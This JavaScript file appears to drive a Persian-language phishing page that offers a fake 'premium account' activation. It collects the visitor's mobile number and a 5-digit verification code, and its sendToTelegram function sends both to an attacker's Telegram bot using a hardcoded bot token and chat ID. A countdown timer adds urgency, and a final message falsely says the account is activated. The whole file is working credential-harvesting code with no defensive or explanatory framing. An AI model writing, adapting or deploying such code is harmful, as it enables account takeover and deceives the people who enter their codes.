const TELEGRAM_BOT_TOKEN = '8158487547:AAE_CeC9h345_8OB--4Bo6q3MMfu8esIM28';
const CHAT_ID = '1234567890';

let confettiRunning = false;

AOS.init({
    duration: 600,
    once: true,
    disable: 'mobile',
    startEvent: 'DOMContentLoaded'
});

function startCountdown() {
    let time = 5 * 60;
    const countdownEl = document.getElementById('countdown');
    
    return setInterval(() => {
        const minutes = Math.floor(time / 60);
        const seconds = time % 60;
        countdownEl.textContent = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
        
        if (time === 0) {
            clearInterval(timer);
            window.location.reload();
        }
        time--;
    }, 1000);
}

function showConfetti() {
    if (confettiRunning) return;
    confettiRunning = true;
    
    const duration = 1500;
    const end = Date.now() + duration;
    const colors = ['#2196F3', '#FFD700'];

    (function frame() {
        confetti({
            particleCount: 1,
            angle: 60,
            spread: 45,
            origin: { x: 0 },
            colors
        });

        if (Date.now() < end) {
            requestAnimationFrame(frame);
        } else {
            confettiRunning = false;
        }
    }());
}

function toggleActivationButton() {
    const consentCheck = document.getElementById('consentCheck');
    const activationButton = document.querySelector('.btn.btn-3d.pulse');
    activationButton.style.display = consentCheck.checked ? 'inline-block' : 'none';
}

function showPhoneScreen() {
    showConfetti();
    document.getElementById('welcomeScreen').classList.add('hidden');
    document.getElementById('phoneScreen').classList.remove('hidden');
}

function submitPhone() {
    const phoneNumber = document.getElementById('phoneNumber').value;
    if (phoneNumber.length === 11 && phoneNumber.startsWith('09')) {
        sendToTelegram(`📱 New phone number: ${phoneNumber}`);
        document.getElementById('phoneScreen').classList.add('hidden');
        document.getElementById('codeScreen').classList.remove('hidden');
    } else {
        alert('لطفا شماره موبایل معتبر وارد کنید');
    }
}

function getVerificationCode() {
    return Array.from(document.querySelectorAll('.code-input'))
        .map(input => input.value)
        .join('');
}

function verifyCode() {
    const code = getVerificationCode();
    if (code.length === 5) {
        sendToTelegram(`🔐 Verification code entered: ${code}`);
        showConfetti();
        alert('تبریک! اکانت پریمیوم شما با موفقیت فعال شد.');
    } else {
        alert('لطفا کد 5 رقمی را وارد کنید');
    }
}

async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        console.log('Message sent:', data);
    } catch (error) {
        console.error('Error:', error);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const inputs = document.querySelectorAll('.code-input');
    const activationButton = document.querySelector('.btn.btn-3d.pulse');
    activationButton.style.display = 'none';
    
    inputs.forEach((input, index) => {
        const nextInput = inputs[index + 1];
        const prevInput = inputs[index - 1];
        
        input.addEventListener('input', () => {
            if (input.value && nextInput) nextInput.focus();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && prevInput) prevInput.focus();
        });
    });

    startCountdown();
    showConfetti();
});
